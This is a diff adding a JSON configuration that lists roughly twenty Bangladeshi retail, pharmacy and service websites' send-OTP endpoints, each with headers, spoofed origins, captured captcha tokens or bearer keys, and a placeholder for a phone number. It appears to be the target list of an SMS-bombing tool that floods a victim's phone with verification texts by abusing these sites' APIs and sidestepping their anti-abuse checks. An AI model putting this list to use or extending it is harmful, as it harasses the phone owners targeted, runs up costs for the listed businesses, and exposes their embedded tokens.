@@ -1,0 +1,346 @@
+{
+  "targets": [
+    {
+      "name": "Shajgoj",
+      "type": "POST",
+      "base": "https://bk.shajgoj.com",
+      "route": "/api/customers/send-otp",
+      "headers": {
+        "Content-Type": "application/json",
+        "origin": "https://shop.shajgoj.com",
+        "referer": "https://shop.shajgoj.com/",
+        "priority": "u=1, i"
+      },
+      "bodyTemplate": {
+        "phone": "88__NUMBER__",
+        "recaptcha": "0cAFcWeA7pWhuq3z9FXvy_BfAtojXDftNk9IyB1G0pGgUbJAEe8ejK_6QeL4XrDQyZDZZowSi2zVy1X8I6VTgs0JihQMPm2W1cKV7CTud3RZaM65YAgZcnWccSf733zkFNoQ9Nnt1mxb2qcGCAI1ANlPK0NBXR9jnSQZOq3AbubIYZ6Zm_EYHF2i5yNhpGkHbANBHkwDOfAXaeTdsEhS5mK_w86TiqXKpiycPf_rItUHFW8ugT9p-K4inri2P4RstfYDu7MB27XUsULdIm7l-BneZNg99MJLftisUsm9xHS-CMJVw3tR0jvtSYboHzKEMUK0k8Os9KpDcB6evQKuk37xMAlCgjssr-5RrbAYT8TN5XY8dcwLkjtFDBSRrS7XGtTcD7C3cpR8WViomx3xG5B_FaRsg8C1mLwiqb54vkI5ZyVJH0O1fKZnOkj3N1r0Gt5rimflPtcVsIXq3SYSSUfaIwToGQXjo9I5QQLlL2pR7mxyhnLRImFIOx6Dm9wZ2BL8koTaYUXfW-yx08YFxurI6LixIFfdR27atYQetf8bMJgOElSD4v5M9EOgcVgGTW5mn7Uu6Lup1_eUcNGwYMq9HBN4R1G5ihaKHdeK9nmgFO31CjIh1rZp3o9Q2pQ4UWX9HNhP4iwDfWsY-NrbowDggvqtJLWGbfo5gRIJhb_sO6G4tBvuNjN5ghctyE9S_qxbQHc2VEi63tIOaJGQLIt28RT5jn15O-YjaXWTaEaNZYJQEAuUdxqhJLFjq3DQAHD-3YhO9z1tcV1KrA7p7EhXuiDX6eCWa2JJX2QsYouvPvePZt7mwgb3KQ_5eO6UfRwYAk8WdS49LN"
+      }
+    },
+    {
+      "name": "MeenaBazar",
+      "type": "POST",
+      "base": "https://mbonlineapi.com",
+      "route": "/api/front/send/otp",
+      "headers": {
+        "Content-Type": "application/json",
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://meenabazaronline.com",
+        "Referer": "https://meenabazaronline.com/",
+        "Authorization": "Bearer KpWhYr3o3rJwZhsXGUwx1SI56b1BWoth8Na9cbMdobi23Wv3J4QxvqfYPkrz",
+        "token": "Bearer KpWhYr3o3rJwZhsXGUwx1SI56b1BWoth8Na9cbMdobi23Wv3J4QxvqfYPkrz"
+      },
+      "bodyTemplate": {
+        "CellPhone": "__NUMBER__",
+        "type": "login"
+      }
+    },
+    {
+      "name": "Laobaan",
+      "type": "POST",
+      "base": "https://api.laobaan.com",
+      "route": "/api/frontend/user-dashboard/access/get-otp",
+      "headers": {
+        "Content-Type": "application/json",
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://laobaan.com",
+        "Referer": "https://laobaan.com/",
+        "appname": "laobaan",
+        "key": "user.get_otp49f46a5cc211a231ac43eb4fc3ba4fab",
+        "token": "e5282d35bacf3c9aa21e5ad897a73f1f"
+      },
+      "bodyTemplate": {
+        "phone": "__NUMBER__"
+      }
+    },
+    {
+      "name": "TanhasCollection",
+      "type": "POST",
+      "base": "https://app.tanhascollection.com",
+      "route": "/api/get_otp",
+      "headers": {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://tanhascollection.com",
+        "Referer": "https://tanhascollection.com/"
+      },
+      "bodyTemplate": {
+        "phone": "__NUMBER__"
+      }
+    },
+    {
+      "name": "Chaldal",
+      "type": "POST",
+      "base": "https://chaldal.com/yolk/api-v4/Auth/RequestOtpWithApiKey",
+      "bodyTemplate": {},
+      "queryParamsTemplate": {
+        "apiKey": "0cAFcWeA5eKDNLblw2n5t566B681MPGfks51tUk4ugb5cjPxxzN_JtWmrnJzfi7RMhHRC3enLTmIC8w0KRefOKt66YG6hblAc4-5Ul29QB_x08ofCS3P7XDknO10Za2d1vgMibomp8PrErDGaD33FykqB5Wvg9grY9fIVL051qFjvSV2NcaUqZy3yZ8kFNv-ze5_N65DdSfLEeZCKwO2wDT_-R7UeZMSFCmwToR3XmmFtbrDRIksBiO9ZnRLzA6f2GycHEmyoKKsXLWAh4WsBvY4JMtqSjpdjKWHhqeb55S4_BhjewTe1dhnh326XLfEDVGeD7Z1J5EmoJSqmrKDQiLJoj_fQncr1Kgs_zhrbojKPDcNjS98qafXvA_jEgJJ7FohsXuPLTNyw_8138ZwznqiQCY26vyDD8qRR9t4QnHHMihqIAZzCf8P0S5StN-Y0-e-0w7VsCplhKBuvB5ZFrTvFBWKRJmQ2dgp6uNtDsxw94xNFzISrpauUja3nxhGa0IKaNxnnMv_YhcJTLd-0zK7iS4kYuoDqnfecbL7_xcaSxntPDvGOWebpizqXfhRSIGOh0sObpxX-X73FYcYnLRNxFiYBvt_RERzWgDdtIiX9Q3Y1y3qTbrEqvpa-KHmPUZ4QNuPn40Q_B5avc1D6LYK4G8SQA4XvIWdect42QswHm63Hb1qQggT28TkiLropZME0Gxkby4_Ux9VLZC9ADDuoqz4lSECYub7Fw_9trUVE0rDcChgNXHKHnigPtz018Yy9z8YfnRvA",
+        "phoneNumber": "__NUMBER__",
+        "retryAttempt": "0"
+      },
+      "headers": {
+        "Content-Type": "application/json",
+        "accept": "application/json",
+        "origin": "https://chaldal.com",
+        "referer": "https://chaldal.com/",
+        "x-egg-clientapp": "Omelette",
+        "x-egg-platform": "Browser",
+        "x-egg-storeid": "1"
+      }
+    },
+    {
+      "name": "Apex4U",
+      "type": "POST",
+      "base": "https://api.apex4u.com/api/auth/login",
+      "bodyTemplate": {
+        "phoneNumber": "__NUMBER__"
+      },
+      "headers": {
+        "Content-Type": "application/json",
+        "accept": "application/json, text/plain, */*",
+        "origin": "https://apex4u.com",
+        "referer": "https://apex4u.com/"
+      }
+    },
+    {
+      "name": "Medeasy",
+      "type": "GET",
+      "base": "https://api.medeasy.health/api/send-otp/",
+      "queryParam": null,
+      "headers": {
+        "accept": "application/json",
+        "origin": "https://medeasy.health",
+        "referer": "https://medeasy.health/"
+      }
+    },
+    {
+      "name": "Bikroy",
+      "type": "GET",
+      "base": "https://bikroy.com",
+      "route": "/data/phone_number_login/verifications/phone_login",
+      "queryParam": "phone"
+    },
+    {
+      "name": "Quizgiri",
+      "type": "POST",
+      "base": "https://developer.quizgiri.xyz/api/v2.0/send-otp",
+      "headers": {
+        "Content-Type": "application/json; charset=utf-8",
+        "x-requested-with": "XMLHttpRequest",
+        "Origin": "https://app.quizgiri.com.bd",
+        "Referer": "https://app.quizgiri.com.bd/"
+      },
+      "bodyTemplate": {
+        "phone": "__NUMBER__",
+        "country_code": "+88"
+      }
+    },
+    {
+      "name": "Arogga",
+      "type": "POST",
+      "base": "https://api.arogga.com",
+      "route": "/auth/v1/sms/send/?f=web&b=Chrome&v=142.0.0.0&os=Windows&osv=10",
+      "headers": {
+        "Content-Type": "multipart/form-data",
+        "Origin": "https://www.arogga.com",
+        "Referer": "https://www.arogga.com/"
+      },
+      "bodyTemplate": {
+        "f": "web",
+        "b": "Chrome",
+        "v": "142.0.0.0",
+        "os": "Windows",
+        "osv": "10",
+        "mobile": "__NUMBER__",
+        "fcmToken": "referral"
+      }
+    },
+    {
+      "name": "Shwapno",
+      "type": "POST",
+      "base": "https://www.shwapno.com",
+      "route": "/api/auth",
+      "headers": {
+        "Content-Type": "application/json",
+        "Origin": "https://www.shwapno.com",
+        "Referer": "https://www.shwapno.com/"
+      },
+      "bodyTemplate": {
+        "phoneNumber": "__NUMBER__"
+      }
+    },
+    {
+      "name": "GogoBangla",
+      "type": "POST",
+      "base": "https://api.gogobangla.com",
+      "route": "/api/v1/subject/Session/actMaybeConstructAndWait/E1G414Lkb0u7iETNMc7MbA",
+      "headers": {
+        "Content-Type": "application/json",
+        "Origin": "https://gogobangla.com",
+        "Referer": "https://gogobangla.com/"
+      },
+      "query": {
+        "waitForMs": "20000",
+        "projection": "PublicSession"
+      },
+      "bodyTemplate": {
+        "Action": [
+          "RequestOtp",
+          {
+            "Value_": [
+              "BdMobileNumber",
+              "+88__NUMBER__"
+            ]
+          }
+        ],
+        "Constructor": [
+          "NewFromId",
+          [
+            "SessionId",
+            "d7b85113-e482-4b6f-bb88-44cd31cecc6c"
+          ]
+        ],
+        "LifeEvent": [
+          "RequestOtpComplete",
+          false
+        ]
+      }
+    },
+    {
+      "name": "Cookups",
+      "type": "POST",
+      "base": "https://api.cookups.app",
+      "route": "/api/v1/subject/Session/actMaybeConstruct/mOuT_P-rnEaJ3uwtRT-Xnw",
+      "headers": {
+        "Content-Type": "application/json",
+        "Origin": "https://cookups.app",
+        "Referer": "https://cookups.app/"
+      },
+      "bodyTemplate": {
+        "Action": [
+          "GenerateOtp",
+          {
+            "Value_": [
+              "BdMobileNumber",
+              "+88__NUMBER__"
+            ]
+          }
+        ],
+        "Constructor": [
+          "NewFromId",
+          [
+            "SessionId",
+            "fc93eb98-abff-469c-89de-ec2d453f979f"
+          ]
+        ]
+      }
+    },
+    {
+      "name": "TruckLagbe",
+      "type": "POST",
+      "base": "https://tethys.trucklagbe.com/tl_gateway/tl_login/124/loginWithPhoneNo",
+      "headers": {
+        "Content-Type": "application/json",
+        "Origin": "https://trucklagbe.com",
+        "Referer": "https://trucklagbe.com/",
+        "source": "website",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+      },
+      "bodyTemplate": {
+        "userType": "shipper",
+        "phoneNo": "__NUMBER__"
+      }
+    },
+    {
+      "name": "Rokomari",
+      "type": "POST",
+      "base": "https://www.rokomari.com",
+      "route": "/otp/send",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Origin": "https://www.rokomari.com",
+        "Referer": "https://www.rokomari.com/login",
+        "X-Requested-With": "XMLHttpRequest",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36"
+      },
+      "bodyTemplate": {
+        "emailOrPhone": "88__NUMBER__",
+        "countryCode": "BD"
+      }
+    },
+    {
+      "name": "KhaasFood",
+      "type": "POST",
+      "base": "https://www.khaasfood.com",
+      "route": "/wp-admin/admin-ajax.php",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Origin": "https://www.khaasfood.com",
+        "Referer": "https://www.khaasfood.com/",
+        "X-Requested-With": "XMLHttpRequest",
+        "User-Agent": "dynamic"
+      },
+      "bodyTemplate": {
+        "mobileNo": "__NUMBER__",
+        "countrycode": "+880",
+        "csrf": "__CSRF__",
+        "login": "1",
+        "json": "1",
+        "action": "digits_check_mob"
+      },
+      "dynamicToken": "csrf"
+    },
+    {
+      "name": "Swap",
+      "type": "POST",
+      "base": "https://api.swap.com.bd",
+      "route": "/api/v1/send-otp/v2",
+      "headers": {
+        "Content-Type": "application/json",
+        "Origin": "https://swap.com.bd",
+        "Referer": "https://swap.com.bd/",
+        "signature": "__SIGNATURE__",
+        "User-Agent": "dynamic"
+      },
+      "bodyTemplate": {
+        "phone": "__NUMBER__"
+      },
+      "dynamicToken": "signature"
+    },
+    {
+      "name": "SaraLifestyle",
+      "type": "POST",
+      "base": "https://prod.saralifestyle.com",
+      "route": "/api/Master/SendTokenV1",
+      "headers": {
+        "Content-Type": "application/json",
+        "Origin": "https://saralifestyle.com",
+        "Referer": "https://saralifestyle.com/",
+        "cf-turnstile-response": "0.rXVVbmwpmhRnndtXPZp9epyhsAwmCg1HhLGeMhgHVPrAH23d03eDTodCsmwTkxodEIA4nMwysZszn8NbCtzfzinNxPu5kZ0p_60F1iOTcwsUOGikG3FAacCvTI0qPo0ii_6LQSo4yxjkQ6xqH5B61pwhUuIymIPJ3Q2ML9tULSF660wfxHCYPxwiqk5YNL0d-kDM_k_t4vMIKT5wxKKjbcRFx8B_Dolw1sYR7xzsSEiizXVBgt-Z-ZSPalsOzDtHNPbf4v7rx5M7b1fzRQyRwgjEuq6fJ-38jlL4MnDKvsE2-KUT4y8W9oayRjhjH5Nu1iUgMkRukbsctMhsz_WYR1SJMAkYbb6CPt32xQ27j-Fah9uQMa7ShmAgvtZoFXhOxIxg3epeuNuLuycbn9qAXtmi79rfEVMdVezgcUsjNWMKDC0BXZUtWZCXhPJG4J8aiY9AYwMkzQsIwQ87ZWisSeNgOT26V7uxjuRbPn-wFGdGrn0Zy-CR91DMgLXTE_JCw4_RVLhyA3AIuGY7k0EOobKomMoVCXMPDILQOWCAFe3yM7dCxa1hT--fnC4iEEemhwx9aRj3d9IaNzVJEW8XJZmNC033G72VwDy90uLczDz_3Zn-NCMKQFT9oqDCvFfRirWBNu2Pyelk5_sv46kfi-9Hob5wBLvljb9YalWJHFhYF70U7SWZOWwbFF387EKEaIZRhdta8BbbzfxVlvrtz3Ps1MKt5vMzYApHF-pus-i8yDf-0XqQtv8DaZKk0V9apLoUdqZY2o2ss4eV7bxtwjxjj5PmsVfSSTq31HHj7Cnc3g_B09kTmr8TwesLq6XbNwS-owaNV7C-A5mmeDCmFRgMG0kgcytfcpFu7p9iP1m_VPvsjTWzNXEwSLKY3GvnljIHnhppgk1LE28nNsSAuxMGfEpmHm8RoTkWQTlpwhk.5qNP16Rn5_ykWrf-4VAKDw.ba8f4f9b84aefb0245ca3aafe83a7bac59c0cc24850b99477635e7473c68666d"
+      },
+      "bodyTemplate": {
+        "userContactNo": "__NUMBER__",
+        "userType": "customer",
+        "actionFor": "r"
+      }
+    },
+    {
+      "name": "Sheba",
+      "type": "POST",
+      "base": "https://accountkit.sheba.xyz",
+      "route": "/api/shoot-otp",
+      "tokenEndpoint": "https://api-accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id=8329815A6D1AE6DD",
+      "headers": {
+        "Content-Type": "application/json;charset=UTF-8",
+        "Origin": "https://www.sheba.xyz",
+        "Referer": "https://www.sheba.xyz/",
+        "custom-headers": "{\" portal-name:Customer Web}"
+      },
+      "bodyTemplate": {
+        "mobile": "+88__NUMBER__",
+        "app_id": "8329815A6D1AE6DD",
+        "api_token": "__API_TOKEN__"
+      },
+      "dynamicToken": "api_token"
+    }
+  ]
+}
